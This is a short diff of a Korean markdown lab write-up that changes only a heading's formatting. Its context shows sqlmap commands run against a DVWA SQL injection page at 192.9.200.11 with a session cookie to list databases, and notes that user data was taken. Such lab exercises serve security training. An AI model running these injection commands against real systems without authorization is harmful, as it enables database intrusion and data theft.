@@ -35,7 +35,7 @@ sqlmap -u "http://[Target IP]/vulnerabilities/sqli/?id=1&Submit=Submit#"
 
 Target 서버 `192.9.200.11`의 DVWA SQL Injection 페이지를 대상으로 데이터베이스 목록을 확인하고 사용자 정보를 탈취했다.
 
-#### **데이터베이스 목록 확인**
+#### ***데이터베이스 목록 확인***
 ```bash
 sqlmap -u "http://192.9.200.11/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=..." --dbs
 ```
